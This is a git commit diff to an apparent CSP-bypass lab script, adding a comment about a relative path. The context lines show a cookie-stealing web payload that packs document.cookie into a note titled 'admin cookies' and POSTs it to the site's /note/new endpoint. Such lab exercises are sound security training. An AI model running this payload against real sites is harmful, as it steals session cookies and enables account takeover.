87d51ec9cd127a5c15eb0d45220bdd85ffab3c88
Kevin Fagan <kevinfagan608@gmail.com>
2023-02-07 20:15:21 -0600

    Update csp-bypass-lab-web-1.js

--- csp-bypass-lab-web-1.js
+++ csp-bypass-lab-web-1.js
@@ -3,6 +3,7 @@ data.append("title", "admin cookies")
 data.append("content", document.cookie)
 data.append("submit", "save")
 
+// The path needs to be relative because of the way the server handles the "admin"
 fetch("/note/new", {
   method: "POST",
   body: data,
